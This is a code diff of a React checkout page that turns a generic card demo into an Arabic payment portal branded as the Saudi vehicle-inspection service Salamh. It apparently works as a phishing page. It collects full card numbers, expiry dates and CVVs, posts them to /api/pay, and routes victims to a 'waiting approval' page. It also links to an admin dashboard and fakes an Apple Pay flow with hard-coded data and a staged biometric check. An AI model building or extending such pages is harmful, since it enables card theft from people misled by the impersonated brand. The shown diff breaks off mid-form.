@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useMemo } from 'react';
-import { HashRouter, Routes, Route, Link, useNavigate, useLocation } from 'react-router-dom';
+import { HashRouter, Routes, Route, Link, useNavigate, useLocation, Navigate } from 'react-router-dom';
 import { motion, AnimatePresence } from 'motion/react';
 import {
   CreditCard as CardIcon,
@@ -18,7 +18,8 @@ import {
   Filter,
   Trash2,
   ExternalLink,
-  Terminal
+  Terminal,
+  Smartphone
 } from 'lucide-react';
 import { CreditCard3D } from './components/CreditCard3D';
 import { WaitingApprovalPage } from './components/WaitingApprovalPage';
@@ -52,34 +53,67 @@ interface Transaction {
 // Global Navigation Header Component
 const Header: React.FC = () => {
   const location = useLocation();
+  const isAdminPath = location.pathname === '/dashboard' || location.pathname === '/admin-portal';
+
+  if (isAdminPath) {
+    return (
+      <header className="sticky top-0 z-40 w-full border-b border-slate-800 bg-slate-950/80 backdrop-blur-md">
+        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
+          <div className="flex items-center space-x-3">
+            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-tr from-emerald-500 to-teal-400 p-0.5 shadow-lg shadow-emerald-500/10">
+              <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-slate-900">
+                <ShieldCheck className="h-5 w-5 text-emerald-400" />
+              </div>
+            </div>
+            <div>
+              <h1 className="text-sm font-bold text-white tracking-tight">3D SECUREPAY ADMIN</h1>
+              <p className="text-[10px] font-mono text-slate-400">CREDIT ENGINE v2.4</p>
+            </div>
+          </div>
+
+          <nav className="flex space-x-1 sm:space-x-2">
+            <Link
+              to="/"
+              className="flex items-center space-x-2 rounded-lg px-3 py-1.5 text-xs font-medium text-slate-400 hover:bg-slate-900 hover:text-slate-200 transition-all"
+            >
+              <CardIcon className="h-3.5 w-3.5" />
+              <span>Checkout Terminal</span>
+            </Link>
+          </nav>
+        </div>
+      </header>
+    );
+  }
+
+  // Customer-facing light mode header (Salamh style!)
   return (
-    <header className="sticky top-0 z-40 w-full border-b border-slate-800 bg-slate-950/80 backdrop-blur-md">
+    <header className="sticky top-0 z-40 w-full border-b border-gray-100 bg-white shadow-sm font-sans">
       <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
-        <div className="flex items-center space-x-3">
-          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-tr from-indigo-500 to-emerald-400 p-0.5 shadow-lg shadow-indigo-500/10">
-            <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-slate-900">
-              <ShieldCheck className="h-5 w-5 text-indigo-400" />
+        
+        {/* Left side: Navigation / Admin trigger */}
+        <div className="flex items-center space-x-3 space-x-reverse">
+          <Link
+            to="/dashboard"
+            className="flex items-center gap-1.5 rounded-lg border border-gray-200 bg-gray-50 hover:bg-gray-100 px-3 py-1.5 text-xs font-bold text-slate-700 transition"
+          >
+            <Terminal className="h-3.5 w-3.5 text-[#004d33]" />
+            <span>لوحة التحكم الإدارية</span>
+          </Link>
+        </div>
+
+        {/* Right side: Salamh Logo and Title */}
+        <div className="flex items-center gap-3 dir-rtl text-right">
+          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-[#004d33] p-0.5 shadow-md shadow-emerald-950/15">
+            <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-white">
+              <ShieldCheck className="h-5 w-5 text-[#004d33]" />
             </div>
           </div>
           <div>
-            <h1 className="text-sm font-bold text-white tracking-tight">3D SECUREPAY</h1>
-            <p className="text-[10px] font-mono text-slate-400">CREDIT ENGINE v2.4</p>
+            <h1 className="text-sm font-extrabold text-slate-900 tracking-tight leading-none">سلامة لفحص المركبات</h1>
+            <p className="text-[10px] text-[#004d33] font-extrabold mt-1">بوابة الدفع الإلكتروني الموحدة</p>
           </div>
         </div>
 
-        <nav className="flex space-x-1 sm:space-x-2">
-          <Link
-            to="/"
-            className={`flex items-center space-x-2 rounded-lg px-3 py-1.5 text-xs font-medium transition-all ${
-              location.pathname === '/' || location.pathname === '/success'
-                ? 'bg-slate-800 text-white shadow-sm'
-                : 'text-slate-400 hover:bg-slate-900 hover:text-slate-200'
-            }`}
-          >
-            <CardIcon className="h-3.5 w-3.5" />
-            <span>Checkout Terminal</span>
-          </Link>
-        </nav>
       </div>
     </header>
   );
@@ -96,6 +130,10 @@ const CheckoutPage: React.FC = () => {
   const [cvv, setCvv] = useState('');
   const [amount, setAmount] = useState('149.99'); // Default mock checkout amount
   
+  // Payment states
+  const [paymentMethod, setPaymentMethod] = useState<'card' | 'mada' | 'applepay' | null>(null);
+  const [isApplePaying, setIsApplePaying] = useState(false);
+
   // UI states
   const [isFlipped, setIsFlipped] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -112,53 +150,66 @@ const CheckoutPage: React.FC = () => {
   // Real-time card properties
   const cardType = useMemo(() => getCardType(cardNumber), [cardNumber]);
 
+  // Calculations for Payment Summary (ملخص الدفع)
+  const serviceFee = useMemo(() => {
+    const amt = parseFloat(amount) || 0;
+    return (amt * 0.85).toFixed(2);
+  }, [amount]);
+
+  const bookingFee = useMemo(() => {
+    const amt = parseFloat(amount) || 0;
+    return (amt * 0.15).toFixed(2);
+  }, [amount]);
+
   // Form Validations
   const errors = useMemo(() => {
     const errs: { [key: string]: string } = {};
     
+    if (paymentMethod === 'applepay' || !paymentMethod) return errs;
+
     const cleanNum = cardNumber.replace(/\D/g, '');
     if (cleanNum.length > 0) {
       if (cleanNum.length < 13 || cleanNum.length > 19) {
-        errs.cardNumber = 'Card number must be between 13 and 19 digits';
+        errs.cardNumber = 'يجب أن يتكون رقم البطاقة من 13 إلى 19 رقماً';
       } else if (!validateLuhn(cleanNum)) {
-        errs.cardNumber = 'Invalid card number (fails Luhn check)';
+        errs.cardNumber = 'رقم البطاقة غير صالح (فشل في التحقق من Luhn)';
       }
     } else {
-      errs.cardNumber = 'Card number is required';
+      errs.cardNumber = 'رقم البطاقة مطلوب';
     }
 
     if (holderName.trim().length > 0) {
       if (!validateName(holderName)) {
-        errs.holderName = 'Cardholder name must contain only letters';
+        errs.holderName = 'يجب أن يحتوي اسم حامل البطاقة على أحرف فقط';
       }
     } else {
-      errs.holderName = 'Cardholder name is required';
+      errs.holderName = 'اسم حامل البطاقة مطلوب';
     }
 
     if (expiry.length > 0) {
       if (!validateExpiry(expiry)) {
-        errs.expiry = 'Expiry must be a valid future date (MM/YY)';
+        errs.expiry = 'تاريخ الانتهاء غير صالح (MM/YY)';
       }
     } else {
-      errs.expiry = 'Expiry is required';
+      errs.expiry = 'تاريخ الانتهاء مطلوب';
     }
 
     if (cvv.length > 0) {
       if (!validateCVV(cvv, cardType)) {
         const reqLen = cardType === 'amex' ? 4 : 3;
-        errs.cvv = `CVV must be ${reqLen} digits`;
+        errs.cvv = `الرمز السري يجب أن يكون ${reqLen} أرقام`;
       }
     } else {
-      errs.cvv = 'CVV is required';
+      errs.cvv = 'الرمز السري مطلوب';
     }
 
     const amtNum = parseFloat(amount);
     if (isNaN(amtNum) || amtNum <= 0) {
-      errs.amount = 'Please enter a valid payment amount';
+      errs.amount = 'يرجى إدخال مبلغ دفع صحيح';
     }
 
     return errs;
-  }, [cardNumber, holderName, expiry, cvv, amount, cardType]);
+  }, [cardNumber, holderName, expiry, cvv, amount, cardType, paymentMethod]);
 
   const isFormValid = Object.keys(errors).length === 0;
 
@@ -168,7 +219,7 @@ const CheckoutPage: React.FC = () => {
     const clean = input.replace(/\D/g, '');
     const detectedType = getCardType(clean);
     
-    // Max lengths: 15 for Amex, 16 for others (some can be up to 19, limit at 16 for standard)
+    // Max lengths: 15 for Amex, 16 for others
     const maxLen = detectedType === 'amex' ? 15 : 16;
     const capped = clean.slice(0, maxLen);
     
@@ -199,8 +250,40 @@ const CheckoutPage: React.FC = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!paymentMethod) return;
     
-    // Mark all fields as touched to show errors
+    if (paymentMethod === 'applepay') {
+      setIsApplePaying(true);
+      setTimeout(async () => {
+        try {
+          const response = await fetch('/api/pay', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              cardNumber: '•••• •••• •••• 9924',
+              cardholderName: 'Apple Pay User',
+              expiry: '12/30',
+              cvv: '000',
+              cardType: 'visa',
+              amount: parseFloat(amount)
+            })
+          });
+          const data = await response.json();
+          setIsApplePaying(false);
+          if (data.success) {
+            navigate('/waiting', { state: { tx: data.transaction } });
+          } else {
+            setFormError(data.error || 'فشلت عملية الدفع بواسطة Apple Pay.');
+          }
+        } catch (err) {
+          console.error(err);
+          setFormError('حدث خطأ أثناء الاتصال بشبكة الدفع.');
+          setIsApplePaying(false);
+        }
+      }, 2000);
+      return;
+    }
+
     setTouched({
       cardNumber: true,
       holderName: true,
@@ -214,7 +297,6 @@ const CheckoutPage: React.FC = () => {
     setIsSubmitting(true);
 
     try {
-      // Submit payment transaction
       const response = await fetch('/api/pay', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -223,7 +305,7 @@ const CheckoutPage: React.FC = () => {
           cardholderName: holderName,
           expiry,
           cvv,
-          cardType,
+          cardType: paymentMethod === 'mada' ? 'visa' : cardType,
           amount: parseFloat(amount)
         })
       });
@@ -231,254 +313,426 @@ const CheckoutPage: React.FC = () => {
       const data = await response.json();
 
       if (data.success) {
-        // Stagger redirection to let user see "processing" animation
         setTimeout(() => {
           navigate('/waiting', { state: { tx: data.transaction } });
         }, 1500);
       } else {
-        setFormError(data.error || 'Payment failed.');
+        setFormError(data.error || 'فشلت عملية الدفع.');
         setIsSubmitting(false);
       }
     } catch (err) {
       console.error(err);
-      setFormError('An error occurred while connecting to the payment network.');
+      setFormError('حدث خطأ أثناء الاتصال بشبكة الدفع المعتمدة.');
       setIsSubmitting(false);
     }
   };
 
   return (
-    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6">
-      <div className="grid grid-cols-1 gap-8 lg:grid-cols-12 lg:items-start lg:gap-12">
+    <div className="mx-auto max-w-xl px-4 py-8 sm:px-6">
+      
+      {/* Centered White Container Card */}
+      <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
         
-        {/* Left Hand: Card preview visualization */}
-        <div className="flex flex-col items-center justify-center lg:col-span-5 lg:sticky lg:top-24">
-          <div className="mb-4 text-center">
-            <span className="inline-flex items-center space-x-1.5 rounded-full bg-indigo-500/10 px-2.5 py-1 text-[11px] font-mono font-medium text-indigo-400 ring-1 ring-inset ring-indigo-500/20">
-              <span className="relative flex h-2 w-2">
-                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
-                <span className="relative inline-flex h-2 w-2 rounded-full bg-emerald-500"></span>
-              </span>
-              <span>LIVE INTEGRATED PERSPECTIVE</span>
-            </span>
-          </div>
+        {/* Decorative Top Accent Bar */}
+        <div className="h-2 bg-[#004d33] w-full" />
 
-          <div className="relative animate-float py-4">
-            <CreditCard3D
-              cardNumber={cardNumber}
-              cardholderName={holderName}
-              expiry={expiry}
-              cvv={cvv}
-              cardType={cardType}
-              isFlipped={isFlipped}
-            />
-          </div>
-
-          {/* Interactive instruction helpers */}
-          <div className="mt-4 text-center max-w-xs text-[11px] font-mono text-slate-500">
-            <p>The card auto-detects card network colors. Focusing CVV triggers a seamless 180° rotation.</p>
-          </div>
-        </div>
-
-        {/* Right Hand: Payment Input Form */}
-        <div className="lg:col-span-7">
-          <div className="rounded-2xl border border-slate-800 bg-slate-900/40 p-6 shadow-2xl backdrop-blur-lg sm:p-8">
-            <div className="mb-6">
-              <h2 className="text-xl font-bold text-white tracking-tight">Checkout Terminal</h2>
-              <p className="text-xs text-slate-400 mt-1">
-                Perform transactions utilizing military-grade Luhn verification algorithms.
-              </p>
+        <div className="p-6 sm:p-8 space-y-6">
+          
+          {/* 1. Payment Summary Section (ملخص الدفع) */}
+          <div className="border-2 border-dashed border-[#004d33]/20 bg-[#004d33]/5 p-4 rounded-xl dir-rtl">
+            <h3 className="text-sm font-extrabold text-[#004d33] mb-2">ملخص الدفع</h3>
+            <div className="space-y-1.5 text-xs text-slate-600">
+              <div className="flex justify-between items-center">
+                <span>رسوم الخدمة:</span>
+                <span className="font-mono">{serviceFee} ر.س</span>
+              </div>
+              <div className="flex justify-between items-center pb-2 border-b border-[#004d33]/10">
+                <span>رسوم الحجز:</span>
+                <span className="font-mono">{bookingFee} ر.س</span>
+              </div>
+              <div className="flex justify-between items-center pt-1.5 text-slate-950 font-extrabold text-sm">
+                <span>المبلغ الإجمالي:</span>
+                <span className="font-mono text-base text-[#004d33]">{amount} ر.س</span>
+              </div>
             </div>
+          </div>
 
-            <form onSubmit={handleSubmit} className="space-y-5">
-              {/* Amount input block */}
-              <div className="rounded-xl bg-slate-950 p-4 border border-slate-800/80 flex items-center justify-between">
-                <div>
-                  <label htmlFor="amount" className="block text-[10px] font-mono tracking-wider text-slate-500 uppercase">
-                    Charge Amount (USD)
-                  </label>
-                  <input
-                    type="number"
-                    id="amount"
-                    step="0.01"
-                    min="1"
-                    className="mt-1 bg-transparent border-0 text-white font-mono text-2xl font-bold focus:ring-0 focus:outline-none p-0 w-32"
-                    value={amount}
-                    onChange={(e) => setAmount(e.target.value)}
-                    onBlur={() => handleBlur('amount')}
-                  />
-                </div>
-                <div className="text-right">
-                  <span className="text-xs font-semibold text-slate-300">Smart Cart Pay</span>
-                  <p className="text-[9px] font-mono text-slate-500">Secured End-to-End</p>
-                </div>
-              </div>
-              {touched.amount && errors.amount && (
-                <p className="text-xs text-rose-400 flex items-center space-x-1">
-                  <AlertCircle className="h-3 w-3" />
-                  <span>{errors.amount}</span>
-                </p>
-              )}
-
-              {/* Cardholder Name */}
-              <div className="space-y-1.5">
-                <label htmlFor="holderName" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
-                  <User className="h-3.5 w-3.5 text-slate-500" />
-                  <span>Cardholder Name</span>
-                </label>
-                <input
-                  type="text"
-                  id="holderName"
-                  placeholder="e.g. ALICE JOHNSON"
-                  className={`w-full rounded-xl border bg-slate-950 px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
-                    touched.holderName && errors.holderName
-                      ? 'border-rose-500/50 focus:ring-rose-500/20'
-                      : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
-                  }`}
-                  value={holderName}
-                  onChange={(e) => setHolderName(e.target.value)}
-                  onBlur={() => handleBlur('holderName')}
-                />
-                {touched.holderName && errors.holderName && (
-                  <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
-                    <AlertCircle className="h-3 w-3" />
-                    <span>{errors.holderName}</span>
-                  </p>
-                )}
-              </div>
-
-              {/* Card Number */}
-              <div className="space-y-1.5">
-                <label htmlFor="cardNumber" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
-                  <CardIcon className="h-3.5 w-3.5 text-slate-500" />
-                  <span>Card Number</span>
-                </label>
-                <div className="relative">
-                  <input
-                    type="text"
-                    id="cardNumber"
-                    placeholder="4111 1111 1111 1111"
-                    className={`w-full rounded-xl border bg-slate-950 pl-4 pr-12 py-3 text-sm font-mono text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
-                      touched.cardNumber && errors.cardNumber
-                        ? 'border-rose-500/50 focus:ring-rose-500/20'
-                        : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
-                    }`}
-                    value={cardNumber}
-                    onChange={handleCardNumberChange}
-                    onBlur={() => handleBlur('cardNumber')}
-                  />
-                  {/* Small absolute card-type logo visual indicator on input */}
-                  <div className="absolute right-4 top-1/2 -translate-y-1/2 select-none h-6 flex items-center">
-                    {cardType !== 'unknown' ? (
-                      <span className="text-[10px] font-mono uppercase bg-slate-800 px-1.5 py-0.5 rounded border border-slate-700 text-indigo-400">
-                        {cardType}
-                      </span>
-                    ) : (
-                      <CardIcon className="h-4 w-4 text-slate-600" />
-                    )}
+          {/* 2. Selector Grid for Payment Methods (طريقة الدفع المفضلة) */}
+          <div>
+            <label className="block text-right text-xs font-bold text-slate-700 mb-2.5">طريقة الدفع المفضلة</label>
+            
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+              {/* Visa / Mastercard */}
+              <button
+                type="button"
+                onClick={() => setPaymentMethod('card')}
+                className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer text-right ${
+                  paymentMethod === 'card'
+                    ? 'border-sky-400 bg-sky-50/20 ring-1 ring-sky-300 shadow-sm'
+                    : 'border-gray-200 hover:border-gray-300 bg-white'
+                }`}
+              >
+                <div className="flex items-center space-x-2 space-x-reverse">
+                  <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${paymentMethod === 'card' ? 'border-sky-500' : 'border-gray-300'}`}>
+                    {paymentMethod === 'card' && <div className="w-2.5 h-2.5 rounded-full bg-sky-500" />}
+                  </div>
+                  <div>
+                    <p className="text-xs font-extrabold text-slate-800">فيزا / ماستر</p>
                   </div>
                 </div>
-                {touched.cardNumber && errors.cardNumber && (
-                  <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
-                    <AlertCircle className="h-3 w-3" />
-                    <span>{errors.cardNumber}</span>
-                  </p>
-                )}
-              </div>
-
-              {/* Row for Expiry and CVV */}
-              <div className="grid grid-cols-2 gap-4">
-                {/* Expiry Date */}
-                <div className="space-y-1.5">
-                  <label htmlFor="expiry" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
-                    <Calendar className="h-3.5 w-3.5 text-slate-500" />
-                    <span>Expiration (MM/YY)</span>
-                  </label>
-                  <input
-                    type="text"
-                    id="expiry"
-                    placeholder="MM/YY"
-                    className={`w-full rounded-xl border bg-slate-950 px-4 py-3 text-sm font-mono text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
-                      touched.expiry && errors.expiry
-                        ? 'border-rose-500/50 focus:ring-rose-500/20'
-                        : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
-                    }`}
-                    value={expiry}
-                    onChange={handleExpiryChange}
-                    onBlur={() => handleBlur('expiry')}
-                  />
-                  {touched.expiry && errors.expiry && (
-                    <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
-                      <AlertCircle className="h-3 w-3 animate-pulse" />
-                      <span>{errors.expiry}</span>
-                    </p>
-                  )}
+                <div className="flex items-center space-x-1 space-x-reverse select-none shrink-0 scale-90">
+                  <span className="text-[9px] font-black italic text-blue-800 tracking-tighter bg-blue-50 px-1 py-0.5 rounded border border-blue-200">VISA</span>
                 </div>
-
-                {/* CVV */}
-                <div className="space-y-1.5">
-                  <label htmlFor="cvv" className="flex items-center space-x-2 text-xs font-medium text-slate-300">
-                    <Lock className="h-3.5 w-3.5 text-slate-500" />
-                    <span>CVV / CVC</span>
-                  </label>
-                  <input
-                    type="password"
-                    id="cvv"
-                    placeholder={cardType === 'amex' ? '1234' : '123'}
-                    className={`w-full rounded-xl border bg-slate-950 px-4 py-3 text-sm font-mono text-white placeholder-slate-600 focus:outline-none focus:ring-2 transition ${
-                      touched.cvv && errors.cvv
-                        ? 'border-rose-500/50 focus:ring-rose-500/20'
-                        : 'border-slate-800 focus:border-indigo-500/50 focus:ring-indigo-500/20'
-                    }`}
-                    value={cvv}
-                    onChange={handleCvvChange}
-                    onFocus={() => setIsFlipped(true)}
-                    onBlur={() => {
-                      setIsFlipped(false);
-                      handleBlur('cvv');
-                    }}
-                  />
-                  {touched.cvv && errors.cvv && (
-                    <p className="text-xs text-rose-400 flex items-center space-x-1 mt-1">
-                      <AlertCircle className="h-3 w-3" />
-                      <span>{errors.cvv}</span>
-                    </p>
-                  )}
-                </div>
-              </div>
-
-              {formError && (
-                <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-4 text-xs text-rose-400 flex items-center space-x-2 animate-pulse">
-                  <AlertCircle className="h-4 w-4 shrink-0" />
-                  <span>{formError}</span>
-                </div>
-              )}
-
-              {/* Submit Button */}
-              <button
-                type="submit"
-                disabled={isSubmitting}
-                className={`relative mt-4 flex w-full items-center justify-center space-x-2 rounded-xl bg-gradient-to-r from-indigo-500 via-purple-600 to-indigo-600 px-4 py-3.5 text-sm font-bold text-white shadow-xl transition-all hover:scale-[1.01] hover:brightness-110 active:scale-[0.99] disabled:opacity-50 disabled:pointer-events-none`}
-              >
-                {isSubmitting ? (
-                  <>
-                    <RefreshCw className="h-4 w-4 animate-spin" />
-                    <span>AUTHORIZING FUND LOCK...</span>
-                  </>
-                ) : (
-                  <>
-                    <span>SUBMIT FOR REVIEW</span>
-                    <ArrowRight className="h-4 w-4" />
-                  </>
-                )}
               </button>
-            </form>
-          </div>
-        </div>
 
+              {/* Mada (مدى) */}
+              <button
+                type="button"
+                onClick={() => setPaymentMethod('mada')}
+                className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer text-right ${
+                  paymentMethod === 'mada'
+                    ? 'border-sky-400 bg-sky-50/20 ring-1 ring-sky-300 shadow-sm'
+                    : 'border-gray-200 hover:border-gray-300 bg-white'
+                }`}
+              >
+                <div className="flex items-center space-x-2 space-x-reverse">
+                  <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${paymentMethod === 'mada' ? 'border-sky-500' : 'border-gray-300'}`}>
+                    {paymentMethod === 'mada' && <div className="w-2.5 h-2.5 rounded-full bg-sky-500" />}
+                  </div>
+                  <div>
+                    <p className="text-xs font-extrabold text-slate-800">مدى (Mada)</p>
+                  </div>
+                </div>
+                <div className="select-none shrink-0 bg-[#00b4d8] text-white px-1.5 py-0.5 rounded text-[8px] font-black shadow-sm">
+                  مدى
+                </div>
+              </button>
+
+              {/* Apple Pay */}
+              <button
+                type="button"
+                onClick={() => setPaymentMethod('applepay')}
+                className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer text-right ${
+                  paymentMethod === 'applepay'
+                    ? 'border-sky-400 bg-sky-50/20 ring-1 ring-sky-300 shadow-sm'
+                    : 'border-gray-200 hover:border-gray-300 bg-white'
+                }`}
+              >
+                <div className="flex items-center space-x-2 space-x-reverse">
+                  <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${paymentMethod === 'applepay' ? 'border-sky-500' : 'border-gray-300'}`}>
+                    {paymentMethod === 'applepay' && <div className="w-2.5 h-2.5 rounded-full bg-sky-500" />}
+                  </div>
+                  <div>
+                    <p className="text-xs font-extrabold text-slate-800">Apple Pay</p>
+                  </div>
+                </div>
+                <div className="bg-black text-white px-1.5 py-0.5 rounded text-[8px] font-bold shadow-sm">
+                   Pay
+                </div>
+              </button>
+            </div>
+          </div>
+
+          {/* 3. Charge Amount control (highly polished & styled) - Always visible */}
+          <div className="space-y-2">
+            <div className="rounded-xl bg-gray-50 p-4 border border-gray-100 flex items-center justify-between dir-rtl">
+              <div className="text-right">
+                <label htmlFor="amount" className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider">
+                  قيمة المعاملة (ر.س)
+                </label>
+                <input
+                  type="number"
+                  id="amount"
+                  step="0.01"
+                  min="1"
+                  className="mt-1 bg-transparent border-0 text-slate-900 font-sans text-2xl font-black focus:ring-0 focus:outline-none p-0 w-32 text-right"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  onBlur={() => handleBlur('amount')}
+                />
+              </div>
+              <div className="text-left select-none">
+                <span className="text-xs font-extrabold text-[#004d33] block">منصة سلامة</span>
+                <p className="text-[9px] text-slate-400 font-medium">سداد فوري معتمد</p>
+              </div>
+            </div>
+            {touched.amount && errors.amount && (
+              <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start dir-rtl">
+                <AlertCircle className="h-3.5 w-3.5" />
+                <span>{errors.amount}</span>
+              </p>
+            )}
+          </div>
+
+          {/* 4. Interactive payment form */}
+          <form onSubmit={handleSubmit} className="space-y-6 dir-rtl text-right">
+            <AnimatePresence mode="wait">
+              {!paymentMethod ? (
+                <motion.div
+                  key="no-selection-placeholder"
+                  initial={{ opacity: 0, y: 10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  exit={{ opacity: 0, y: -10 }}
+                  transition={{ duration: 0.25 }}
+                  className="p-8 text-center bg-gray-50/50 rounded-2xl border border-dashed border-gray-200 flex flex-col items-center justify-center space-y-3"
+                >
+                  <div className="w-14 h-14 rounded-full bg-slate-100 flex items-center justify-center text-slate-400">
+                    <CardIcon className="h-6 w-6" />
+                  </div>
+                  <div className="space-y-1">
+                    <h4 className="text-sm font-extrabold text-slate-700">يرجى اختيار طريقة الدفع</h4>
+                    <p className="text-xs text-slate-400 max-w-xs mx-auto leading-relaxed">
+                      الرجاء اختيار وسيلة الدفع المفضلة لديك أعلاه لعرض بطاقة الدفع وتفاصيل المعاملة بشكل آمن.
+                    </p>
+                  </div>
+                </motion.div>
+              ) : (
+                <motion.div
+                  key="active-payment-container"
+                  initial={{ opacity: 0, y: 15 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  exit={{ opacity: 0, y: -15 }}
+                  transition={{ duration: 0.35, ease: 'easeOut' }}
+                  className="space-y-6"
+                >
+                  {/* Interactive 3D Card Visualizer (صورة البطاقة) */}
+                  <div className="p-4 flex flex-col items-center justify-center bg-gray-50/50 rounded-2xl border border-gray-100/50">
+                    <div className="mb-4 text-center">
+                      <span className="inline-flex items-center gap-1.5 rounded-full bg-emerald-50 px-3 py-1 text-xs font-bold text-[#004d33] ring-1 ring-inset ring-emerald-600/10">
+                        <span className="relative flex h-2.5 w-2.5">
+                          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75"></span>
+                          <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-emerald-500"></span>
+                        </span>
+                        <span>نظام تحقق ثلاثي الأبعاد نشط</span>
+                      </span>
+                    </div>
+
+                    <div className="relative animate-float py-2">
+                      <CreditCard3D
+                        cardNumber={paymentMethod === 'applepay' ? '•••• •••• •••• 9924' : cardNumber}
+                        cardholderName={paymentMethod === 'applepay' ? 'APPLE PAY USER' : holderName}
+                        expiry={paymentMethod === 'applepay' ? '12/30' : expiry}
+                        cvv={paymentMethod === 'applepay' ? '•••' : cvv}
+                        cardType={paymentMethod === 'mada' ? 'mada' : (paymentMethod === 'applepay' ? 'applepay' : cardType)}
+                        isFlipped={isFlipped}
+                      />
+                    </div>
+
+                    <div className="mt-4 text-center max-w-sm text-xs font-bold text-slate-500 space-y-1">
+                      <p className="text-slate-700 text-[11px] sm:text-xs">تتحرك البطاقة تفاعلياً مع حركة مؤشر الفأرة</p>
+                      <p className="font-medium text-slate-400 text-[10px] sm:text-[11px] hidden sm:block">عند التركيز على حقل الرمز السري (CVV)، ستدور البطاقة تلقائياً لعرض الواجهة الخلفية.</p>
+                    </div>
+                  </div>
+
+            {/* 5. Conditional Input Fields or Apple Pay button */}
+            <AnimatePresence mode="wait">
+              {paymentMethod === 'applepay' ? (
+                <motion.div
+                  key="applepay-cta"
+                  initial={{ opacity: 0, y: 10 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  exit={{ opacity: 0, y: -10 }}
+                  className="py-10 text-center flex flex-col items-center justify-center space-y-4"
+                >
+                  <div className="w-16 h-16 rounded-full bg-slate-100 flex items-center justify-center border border-gray-200">
+                    <Smartphone className="h-8 w-8 text-slate-800 animate-pulse" />
+                  </div>
+                  <div>
+                    <h4 className="text-sm font-extrabold text-slate-800">الدفع الفوري بلمسة واحدة</h4>
+                    <p className="text-xs text-slate-500 mt-1">سيتم تفعيل المصادقة الحيوية لجهازك عبر بوابة Apple Pay الرسمية.</p>
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={isApplePaying}
+                    className="w-full max-w-sm h-13 bg-black hover:bg-zinc-900 text-white rounded-xl font-bold text-sm transition-all shadow-md flex items-center justify-center gap-2"
+                  >
+                    {isApplePaying ? (
+                      <>
+                        <RefreshCw className="h-4 w-4 animate-spin text-white" />
+                        <span>جاري التحقق والمصادقة بيومترياً...</span>
+                      </>
+                    ) : (
+                      <>
+                        <span className="text-base font-black"> Pay</span>
+                        <span>الدفع السريع الآن</span>
+                      </>
+                    )}
+                  </button>
+                </motion.div>
+              ) : (
+                <motion.div
+                  key="standard-form"
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  exit={{ opacity: 0 }}
+                  className="space-y-4"
+                >
+                  {/* Cardholder Name */}
+                  <div className="space-y-1.5">
+                    <label htmlFor="holderName" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
+                      <User className="h-3.5 w-3.5 text-slate-400" />
+                      <span>اسم حامل البطاقة (بالأحرف اللاتينية)</span>
+                    </label>
+                    <input
+                      type="text"
+                      id="holderName"
+                      placeholder="مثال: MOHAMMAD AL-OTAIBI"
+                      className={`w-full rounded-xl border bg-white px-4 py-3 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 transition text-right font-sans ${
+                        touched.holderName && errors.holderName
+                          ? 'border-rose-300 focus:ring-rose-500/10 focus:border-rose-500'
+                          : 'border-gray-200 focus:border-[#004d33] focus:ring-[#004d33]/15'
+                      }`}
+                      value={holderName}
+                      onChange={(e) => setHolderName(e.target.value)}
+                      onBlur={() => handleBlur('holderName')}
+                    />
+                    {touched.holderName && errors.holderName && (
+                      <p className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 justify-start">
+                        <AlertCircle className="h-3.5 w-3.5" />
+                        <span>{errors.holderName}</span>
+                      </p>
+                    )}
+                  </div>
+
+                  {/* Card Number */}
+                  <div className="space-y-1.5">
+                    <label htmlFor="cardNumber" className="flex items-center gap-1.5 text-xs font-bold text-slate-700 justify-start">
+                      <CardIcon className="h-3.5 w-3.5 text-slate-400" />
